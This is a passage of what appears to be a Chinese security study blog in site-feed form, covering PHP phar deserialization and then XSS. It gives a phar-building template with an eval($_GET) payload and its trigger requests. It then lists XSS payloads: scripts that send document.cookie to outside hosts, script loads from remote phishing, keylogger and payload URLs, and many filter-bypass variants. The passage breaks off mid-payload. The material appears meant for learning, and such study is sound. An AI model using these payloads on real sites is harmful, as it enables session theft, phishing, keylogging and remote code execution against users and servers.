或更高版本，Phar后缀文件时默认开启支持的，可以直接使用它。</strong></p><p><strong>文件包含：phar伪协议，可读取 .phar文件</strong></p><hr><h2 id="phar结构"><a href="#phar结构" class="headerlink" title="phar结构"></a>phar结构</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-48.png"></p><p><strong>第一部分</strong>：</p><p><strong>stub phar 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;; （头部信息）</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-49.png"></p><hr><p><strong>第二部分：重点关注</strong></p><p><strong>manifest 压缩文件的属性等信息，以序列化存储;</strong></p><p><strong>phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar:&#x2F;&#x2F;伪协议解析phar文件时就会将数据反序列化</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-50.png"></p><hr><p><strong>content 压缩文件的信息</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-51.png"></p><hr><p><strong>signature签名，放在文件末尾</strong></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-52.png"></p><hr><h2 id="phar漏洞原理"><a href="#phar漏洞原理" class="headerlink" title="phar漏洞原理"></a>phar漏洞原理</h2><p><strong>phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar:&#x2F;&#x2F;伪协议解析phar文件时就会将数据反序列化</strong>，而这样的文件操作函数有很多。</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-53.png"></p><h2 id="phar文件构造模版"><a href="#phar文件构造模版" class="headerlink" title="phar文件构造模版"></a>phar文件构造模版</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    所需代码；<br>    &#125;<br>    <br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<span class="hljs-comment">//删除之前的test.phar文件（如果有）</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;test.phar&quot;</span>); <span class="hljs-comment">//创建一个phar对象，文件名必须以phar为后缀</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-comment">//开始写文件</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//写入stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$o</span> -&gt; output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<span class="hljs-comment">//写入要执行的命令，给output成员属性赋值</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;text.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后在有反序列化漏洞的页面构造payload</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">filename</span>=phar://test.phar<span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-54.png"></p><p>命令成功执行</p><hr><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-55.png"></p><h2 id="phar使用条件"><a href="#phar使用条件" class="headerlink" title="phar使用条件"></a>phar使用条件</h2><ol><li><strong>phar文件能上传到服务器端；（后缀名不论，只要上传上去就行）</strong></li><li><strong>要有可用反序列化魔术方法作为跳板；</strong></li><li><strong>要有文件操作函数，如file_exists()，fopen()，file_get_contents()</strong></li><li><strong>文件操作函数参数可控，且：、&#x2F;、phar等特殊字符没有被过滤</strong></li></ol><h2 id="phar反序列化例题"><a href="#phar反序列化例题" class="headerlink" title="phar反序列化例题"></a>phar反序列化例题</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-56.png"></p><p>题目解析：</p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-57.png"></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-58.png"></p><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-59.png"></p><p><strong>然后修改后缀为jpg上传（因为过滤了phar后缀）</strong></p><p><strong>最后使用md5_file函数和phar伪协议去读取我们上传的文件就能触发反序列化了。</strong></p><p><strong>payload</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">post</span>方法<br><span class="hljs-keyword">file</span>=phar:<span class="hljs-comment">//upload/test.jpg</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> PHP反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss漏洞总结</title>
      <link href="/2025/02/12/xss%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2025/02/12/xss%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h1><h2 id="漏洞介绍："><a href="#漏洞介绍：" class="headerlink" title="漏洞介绍："></a>漏洞介绍：</h2><p>XSS 攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为 XSS，XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 web 用户将代码植入到 web 网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生 xss 攻击。</p><h2 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号<br>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力<br>3、盗窃企业重要的具有商业价值的资料<br>4、非法转账<br>5、强制发送电子邮件<br>6、网站挂马<br>7、控制受害者机器向其它网站发起攻击<br></code></pre></td></tr></table></figure><h2 id="如何防御："><a href="#如何防御：" class="headerlink" title="如何防御："></a>如何防御：</h2><p>对输入的参数和URL进行过滤，对输出的参数进行编码，使脚本无法正常执行。</p><h1 id="xss漏洞类型："><a href="#xss漏洞类型：" class="headerlink" title="xss漏洞类型："></a>xss漏洞类型：</h1><h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><p>反射性XSS不是持久化的，攻击脚本不会储存在数据库中，而是构建在链接中，需要欺骗用户进行点击，用户再点击了包含恶意代码的链接后，服务器接收到请求并处理，把带有恶意脚本的发送给用户浏览器，浏览器对恶意脚本进行解析，触发攻击。</p><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>储存型xss，持久化，内容储存在数据库中，如评论、留言、发表文章的地方，对于传输来的数据过滤不严格，那么就可以将恶意代码插入到数据库中，用户访问该页面时，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成 xss 攻击。</p><h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。一般不与后台服务端交互</p><h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><h2 id="1-盗取cookie："><a href="#1-盗取cookie：" class="headerlink" title="1.盗取cookie："></a>1.盗取cookie：</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><h2 id="2-构造页面跳转："><a href="#2-构造页面跳转：" class="headerlink" title="2.构造页面跳转："></a>2.构造页面跳转：</h2><p><code>&lt;script&gt;location=&#39;https://www.hacker.com&#39;&lt;/script&gt;</code></p><h2 id="3-构造获取cookie并发送到远程主机："><a href="#3-构造获取cookie并发送到远程主机：" class="headerlink" title="3.构造获取cookie并发送到远程主机："></a>3.构造获取cookie并发送到远程主机：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://127.0.0.1/test/cookie.phpcookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="4-xss钓鱼演示："><a href="#4-xss钓鱼演示：" class="headerlink" title="4.xss钓鱼演示："></a>4.xss钓鱼演示：</h2><p>钓鱼攻击利用页面</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.32.1/pikachu-master/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="5-xss获取键盘记录"><a href="#5-xss获取键盘记录" class="headerlink" title="5.xss获取键盘记录"></a>5.xss获取键盘记录</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.32.1/pikachu-master/pkxss/rkeypress/rk.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h1><h2 id="常见注入点"><a href="#常见注入点" class="headerlink" title="常见注入点"></a>常见注入点</h2><ul><li>输入框</li><li>留言板</li><li>URL中可传参数的变量</li></ul><h2 id="常用事件："><a href="#常用事件：" class="headerlink" title="常用事件："></a>常用事件：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">onclick</span>: 点击触发 --（&lt;img src=x onclick=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;）<br><span class="hljs-attr">onerror</span>: 当 src 加载不出来时触发 --（&lt;img src=x onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;）<br><span class="hljs-attr">onload</span>: 当 src 加载完毕触发--（&lt;img src=x onload=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;）<br>onmouseover：鼠标指针移动到图片后触发--（&lt;img src=x onmouseover=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;）<br><span class="hljs-attr">onmousemove</span>: 鼠标指针移到指定的元素后触发--（&lt;img src=x onmousemove=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>) &gt;）<br><span class="hljs-attr">onmouseout</span>: 鼠标指针划出指定元素触发--（&lt;img src=x onmouseout=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>) &gt;）<br><span class="hljs-attr">onfocus</span>: 当 input 输入框获取焦点时触发--（&lt;input onfocus=<span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>) autofocus&gt;）<br></code></pre></td></tr></table></figure><h2 id="常用属性："><a href="#常用属性：" class="headerlink" title="常用属性："></a>常用属性：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">src<br>action<br>href<br>data<br>content<br></code></pre></td></tr></table></figure><h2 id="常见标签语句"><a href="#常见标签语句" class="headerlink" title="常见标签语句"></a>常见标签语句</h2><h3 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;test&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="hljs-attribute">autofocus</span>=<span class="hljs-string">&quot;&quot;</span>&gt;xss&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onclick</span>=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onmouseout</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;xss&lt;/a&gt;<br></code></pre></td></tr></table></figure><h3 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;test&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;alert(document.cookie)&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=eval(&quot;alert(1)&quot;)&gt;<br>&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onmouseout</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="hljs-attribute">autofocus</span>=<span class="hljs-string">&quot;&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">onkeydown</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/input&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">onkeypress</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/input&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">onkeydown</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/input&gt;<br></code></pre></td></tr></table></figure><h3 id="object标签"><a href="#object标签" class="headerlink" title="object标签"></a>object标签</h3><p><strong>这个需要借助 data 伪协议和 base64 编码来实现绕过</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">&lt;<span class="hljs-keyword">object</span> <span class="hljs-keyword">data</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;&lt;/<span class="hljs-keyword">object</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="p标签"><a href="#p标签" class="headerlink" title="p标签"></a>p标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onmouseout</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">onmouseup</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="其他标签"><a href="#其他标签" class="headerlink" title="其他标签"></a>其他标签</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br>&lt;video <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br>&lt;button <span class="hljs-attribute">onclick</span>=alert(1)&gt;<br>&lt;form <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;input <span class="hljs-attribute">type</span>=submit&gt;&lt;/form&gt;<br>&lt;body <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;&lt;/body&gt;<br></code></pre></td></tr></table></figure><h1 id="xss常见绕过"><a href="#xss常见绕过" class="headerlink" title="xss常见绕过"></a>xss常见绕过</h1><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScRipT</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">scRiPt</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>比如将 <code>script</code> 替换为空（如果替换为其他字符，双写绕过也没用）。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;scrscriptipt&gt;</span><span class="hljs-attribute">alert</span>(<span class="hljs-number">1</span>)&lt;/scrscriptipt&gt;<br></code></pre></td></tr></table></figure><h2 id="圆括号过滤绕过"><a href="#圆括号过滤绕过" class="headerlink" title="圆括号过滤绕过"></a>圆括号过滤绕过</h2><p>若 <code>alert(1)</code> 函数中的 <code>()</code> 被过滤了，可以考虑使用下面的方式进行绕过：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 反引号替换 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!-- throw 绕过 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;</span>    <br></code></pre></td></tr></table></figure><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><p>有时候空格会被过滤，这里我们可以使用回车的url编码进行绕过</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img%<span class="hljs-number">0</span>Asrc<span class="hljs-operator">=</span><span class="hljs-number">1</span>%<span class="hljs-number">0</span>Aοnerrοr<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><h2 id="alert-过滤绕过"><a href="#alert-过滤绕过" class="headerlink" title="alert 过滤绕过"></a>alert 过滤绕过</h2><p>有时页面会过滤掉alert函数，不使用<code>alert</code>就行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--弹出输入框--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>prompt(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!--弹出提示框--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>confirm(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!--远程加载payload--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;//www.ldlx.com/xss/xss_payload.php?payload=2&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="单引号过滤绕过"><a href="#单引号过滤绕过" class="headerlink" title="单引号过滤绕过"></a>单引号过滤绕过</h2><p>若 <code>alert(&#39;xss&#39;)</code> 中的 <code>&#39;&#39;</code> 被过滤了，可以考虑使用下面的方式进行绕过：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 斜杠替换 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 反引号替换 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">`xss`</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="a标签href属性javascript伪协议绕过"><a href="#a标签href属性javascript伪协议绕过" class="headerlink" title="a标签href属性javascript伪协议绕过"></a>a标签href属性javascript伪协议绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span 